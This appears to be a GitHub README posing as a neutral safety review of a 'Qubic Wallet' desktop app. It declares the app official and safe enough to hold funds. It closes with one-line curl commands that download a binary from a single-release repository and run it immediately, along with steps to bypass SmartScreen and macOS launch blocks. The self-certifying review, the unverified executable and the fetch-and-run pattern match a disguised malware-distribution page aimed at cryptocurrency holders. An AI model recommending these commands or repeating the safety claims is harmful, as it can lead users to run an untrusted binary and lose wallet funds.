![Qubic Wallet safety review](assets/banner-trust.png)

# Is Qubic Wallet Safe? Source, Seed and Installer Evidence

Safe is not a feeling about a logo. Here is what can be checked, and what cannot.

## Downloads - v0.8.2

<p align="center"><a href="https://github.com/qubic-wallet/qubic-desktop-wallet/releases/latest/download/qubic-wallet-desktop-v0.8.2-windows.exe"><img src="assets/download-windows.svg" alt="Download Windows"></a> <a href="https://github.com/qubic-wallet/qubic-desktop-wallet/releases/latest/download/qubic-wallet-desktop-v0.8.2-osx-arm64.zip"><img src="assets/download-macos.svg" alt="Download macOS"></a> <a href="https://github.com/qubic-wallet/qubic-desktop-wallet/releases/latest/download/qubic-wallet-desktop-v0.8.2-linux-x64.zip"><img src="assets/download-linux.svg" alt="Download Linux"></a></p>

| Platform | Requirements | File |
| --- | --- | --- |
| <img src="assets/platform-windows.svg" alt="platform windows"> | Windows 10 (1909) or later, 64-bit | [`qubic-wallet-desktop-v0.8.2-windows.exe`](https://github.com/qubic-wallet/qubic-desktop-wallet/releases/latest/download/qubic-wallet-desktop-v0.8.2-windows.exe) - 57,942,724 B (55.3 MiB) |
| <img src="assets/platform-macos.svg" alt="platform macos"> | macOS 12 or later | [`qubic-wallet-desktop-v0.8.2-osx-arm64.zip`](https://github.com/qubic-wallet/qubic-desktop-wallet/releases/latest/download/qubic-wallet-desktop-v0.8.2-osx-arm64.zip) - 49,066,728 B (46.8 MiB) |
| <img src="assets/platform-linux.svg" alt="platform linux"> | x64, Ubuntu 20.04 or later, or equivalent | [`qubic-wallet-desktop-v0.8.2-linux-x64.zip`](https://github.com/qubic-wallet/qubic-desktop-wallet/releases/latest/download/qubic-wallet-desktop-v0.8.2-linux-x64.zip) - 51,287,539 B (48.9 MiB) |

Every claim below is tied to the repository, the release or the [current Qubic Wallet release](https://github.com/qubic-wallet/qubic-desktop-wallet/releases/tag/v0.8.2) page rather than to reputation.

> Safety here is a short list of things you can verify, and a shorter list of things nobody can.

Qubic Wallet is the official Qubic Wallet and it is reasonably safe to use, with limits you should know before you put a large balance in it. The account never leaves your machine, the seeds are encrypted, and the installer can be checked against a published hash. What is missing is external assurance: no audit, no licence file in the repository, and no build attestation tying the binaries to the source.

<!-- ARTICLE-BODY-BEGIN -->

## What the source shows

The repository is public and readable: a React client, an Express server with socket.io, an Electron 29 shell, and the C sources that build the wasm module. Account handling is local. Seeds are encrypted with your password and written to a file named from that password's hash, and seeds and private keys are scrubbed from memory after use.

That design is the strongest thing this app has going for it: there is no server-side account to breach, because there is no server-side account. The <a href="https://github.com/qubic-wallet/qubic-wallet-trust/blob/main/qubic-wallet-github-source-review.md">repository walkthrough</a> shows where each of those paths lives.

## What the release shows

One release exists in this repository, `v0.8.2`, published 2026-11-22 with four installers. The checksums are published and the macOS and Linux archives each carry a `.sha256` covering the binary inside. Nothing attests that those binaries were built from the current `main` tree, and no workflow file survives to show a build.

## What the seed model means for you

A password that starts with `Q` generates the 55-character Qubic seed; anything else generates a 24-word BIP39 phrase. Either way the phrase is shown once, clipboard copy is blocked, and you must re-enter it before the account opens. That is a real safeguard against a copy-paste mistake, and it is also the moment your backup obligation starts.

## What the app can reach

A wallet that can send can empty itself, so the honest risk is not the software but what runs beside it: a fake installer, a clipboard swap, a support message asking for the seed. The <a href="https://github.com/qubic-wallet/qubic-wallet-trust/blob/main/qubic-wallet-october-2026-weak-seed-incident.md">October 2026 incident</a> is worth reading for the shape of the failure, and it did not name any desktop build.

## Verdict

Treat it as safe enough to hold funds you are prepared to back up properly, and not as audited. Verify the hash, write the phrase down, keep the password separate, and update from the <a href="https://github.com/qubic-wallet/qubic-desktop-wallet/releases/tag/v0.8.2">current Qubic Wallet release</a> rather than from a mirror.

## FAQ

### Is this the official wallet?

Yes. This is the official Qubic Wallet, published by the Qubic Wallet organisation.

### Has it been audited?

No audit is published and none is claimed here. The absence of a repository licence file is a separate gap in the same category.

### Can the developers take my funds?

The design gives them no key to take: the seed is encrypted locally and the server code runs on your machine. That is a statement about the design, not a guarantee about every binary ever distributed.

### Is the download safe?

The download is safe if its hash matches the published value. Compare both levels before running it.

### Does the October 2026 incident affect this desktop build?

No desktop build was named among the affected clients. The incident concerned seed randomness in browser-based generation.

### What is the single biggest risk?

A fake installer, or giving the phrase to someone who asks for it. Both bypass every protection in the app.

<!-- ARTICLE-BODY-END -->

## How to install Qubic Wallet

<!-- INSTALL-BEGIN: D11. Windows ships one .exe; macOS and Linux ship .zip archives holding the executable and its checksum file. Two checksum levels: the download itself, then the .Wallet binary inside the archive. -->
### Windows
Quick install (CMD):

```cmd
curl -fLo setup.exe https://github.com/qubic-wallet/qubic-desktop-wallet/releases/latest/download/qubic-wallet-desktop-v0.8.2-windows.exe && setup.exe
```

Manual install:
1. Download <a href="https://github.com/qubic-wallet/qubic-desktop-wallet/releases/latest/download/qubic-wallet-desktop-v0.8.2-windows.exe">qubic-wallet-desktop-v0.8.2-windows.exe</a>.
2. Verify the download before running it (PowerShell): `Get-FileHash .\setup.exe -Algorithm SHA256`
3. Open the downloaded file.
4. If SmartScreen appears, choose More info, then Run anyway.
5. Finish the setup steps.

### macOS
Quick install (Terminal):

```bash
curl -fLo wallet.zip https://github.com/qubic-wallet/qubic-desktop-wallet/releases/latest/download/qubic-wallet-desktop-v0.8.2-osx-arm64.zip && unzip -o wallet.zip && chmod +x qubic-wallet-desktop-v0.8.2-osx-arm64/qubic-wallet-desktop-v0.8.2-osx-arm64.Wallet && ./qubic-wallet-desktop-v0.8.2-osx-arm64/qubic-wallet-desktop-v0.8.2-osx-arm64.Wallet
```

Manual install:
1. Download <a href="https://github.com/qubic-wallet/qubic-desktop-wallet/releases/latest/download/qubic-wallet-desktop-v0.8.2-osx-arm64.zip">qubic-wallet-desktop-v0.8.2-osx-arm64.zip</a> for Apple silicon, or <a href="https://github.com/qubic-wallet/qubic-desktop-wallet/releases/latest/download/qubic-wallet-desktop-v0.8.2-osx-x64.zip">qubic-wallet-desktop-v0.8.2-osx-x64.zip</a> for an Intel Mac.
2. Verify the download: `shasum -a 256 wallet.zip`
3. Extract the archive; it contains the executable, an icon and a checksum file.
4. Open Terminal in the extracted folder and run `chmod +x` on the `.Wallet` file.
5. Verify the binary against the checksum file inside the archive: `cat qubic-wallet-desktop-v0.8.2-osx-arm64/qubic-wallet-desktop.sha256` then `shasum -a 256 qubic-wallet-desktop-v0.8.2-osx-arm64/qubic-wallet-desktop-v0.8.2-osx-arm64.Wallet`
6. Run that file; if macOS blocks the first launch, allow it under System Settings, Privacy and Security.

### Linux
Quick install (Terminal):

```bash
curl -fLo wallet.zip https://github.com/qubic-wallet/qubic-desktop-wallet/releases/latest/download/qubic-wallet-desktop-v0.8.2-linux-x64.zip && unzip -o wallet.zip && chmod +x qubic-wallet-desktop-v0.8.2-linux-x64/qubic-wallet-desktop-v0.8.2-linux-x64.Wallet && ./qubic-wallet-desktop-v0.8.2-linux-x64/qubic-wallet-desktop-v0.8.2-linux-x64.Wallet
```

Manual install:
1. Download <a href="https://github.com/qubic-wallet/qubic-desktop-wallet/releases/latest/download/qubic-wallet-desktop-v0.8.2-linux-x64.zip">qubic-wallet-desktop-v0.8.2-linux-x64.zip</a>.
2. Verify the download: `sha256sum wallet.zip`
3. Extract the archive.
4. Verify the binary against the checksum file inside the archive: `cat qubic-wallet-desktop-v0.8.2-linux-x64/qubic-wallet-desktop.sha256` then `sha256sum qubic-wallet-desktop-v0.8.2-linux-x64/qubic-wallet-desktop-v0.8.2-linux-x64.Wallet`
5. Mark the `.Wallet` file executable.
6. Run it.

### Published SHA-256 values (upload of 2026-11-22)

| File | Download-level SHA-256 |
| --- | --- |
| `qubic-wallet-desktop-v0.8.2-windows.exe` | `eb8b377ecf884da5932d3721e428823ed2787c061cc3ae3d3afaedc8d8593815` |
| `qubic-wallet-desktop-v0.8.2-osx-arm64.zip` | `8f4414a987a328fd1a75012b4c6a84fc10bc269df58ceb08104fe8c008815c81` |
| `qubic-wallet-desktop-v0.8.2-osx-x64.zip` | `923915b18899a03f7ba5685ec653102c74293d83aa078ffa9961db4c62990cd4` |
| `qubic-wallet-desktop-v0.8.2-linux-x64.zip` | `682d4dc414804fe3359f8e91d370f689aef99f3e82cecc382fd87180269cc9fc` |

Compare the value your command prints with the row for the file you downloaded. The second check reads the `.sha256` file shipped inside the archive, which hashes the extracted `.Wallet` binary and names it `qubic-wallet-desktop`; compare the two hashes by eye rather than running the file as a checklist, because the stored name is not the extracted file name. A mismatch at either level means stop: delete the file and download again from this repository's release page.
<!-- INSTALL-END -->

## Related guides

- [Source review](https://github.com/qubic-wallet/qubic-wallet-trust/blob/main/qubic-wallet-github-source-review.md)
- [October 2026 weak-seed incident](https://github.com/qubic-wallet/qubic-wallet-trust/blob/main/qubic-wallet-october-2026-weak-seed-incident.md)
- [Scams and fake downloads](https://github.com/qubic-wallet/qubic-wallet-trust/blob/main/qubic-wallet-scam-phishing-fake-download.md)
- [Current Qubic Wallet release](https://github.com/qubic-wallet/qubic-desktop-wallet/releases/tag/v0.8.2)
